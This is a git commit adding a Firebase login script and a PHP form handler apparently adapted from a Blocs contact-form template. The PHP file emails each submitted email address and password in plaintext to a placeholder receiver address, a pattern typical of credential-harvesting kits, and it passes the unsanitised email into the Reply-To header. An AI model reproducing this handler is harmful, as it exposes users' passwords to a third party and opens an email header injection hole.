d7978077c87993605c62deb71d3fb5c35779d09a
Stuart-McNeill <84739707+Stuart-McNeill@users.noreply.github.com>
2025-12-03 22:00:25 +0000

    Add files via upload

---
+++ includes/form_40751.php
@@ -0,0 +1,30 @@
+<?php
+	if (empty($_POST['email']) && strlen($_POST['email']) == 0 || empty($_POST['password']) && strlen($_POST['password']) == 0)
+	{
+		return false;
+	}
+	
+	$email = $_POST['email'];
+	$password = $_POST['password'];
+	
+	// Create Message	
+	$to = 'receiver@yoursite.com';
+	$email_subject = "Message from a Blocs website.";
+	$email_body = "You have received a new message. \n\nEmail: $email \nPassword: $password \n";
+	$headers = "MIME-Version: 1.0\r\nContent-type: text/plain; charset=UTF-8\r\n";	
+	$headers .= "From: contact@yoursite.com\r\n";
+	$headers .= "Reply-To: $email";
+
+	// Post Message
+	if (function_exists('mail'))
+	{
+		$result = mail($to,$email_subject,$email_body,$headers);
+	}
+	else // Mail() Disabled
+	{
+		$error = array("message" => "The php mail() function is not available on this server.");
+	    header('Content-Type: application/json');
+	    http_response_code(500);
+	    echo json_encode($error);
+	}	
+?>
---
+++ js/login.js
@@ -0,0 +1,19 @@
+// login.js
+import { app } from "./firebase-config.js";
+import { 
+  getAuth, 
+  signInWithEmailAndPassword 
+} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+
+const auth = getAuth(app);
+
+document.getElementById("loginBtn").addEventListener("click", (e) => {
+  e.preventDefault();
+
+  const email = document.getElementById("email").value;
+  const pass = document.getElementById("password").value;
+
+  signInWithEmailAndPassword(auth, email, pass)
+    .then(() => window.location.href = "dashboard.html")
+    .catch((e) => alert(e.message));
+});
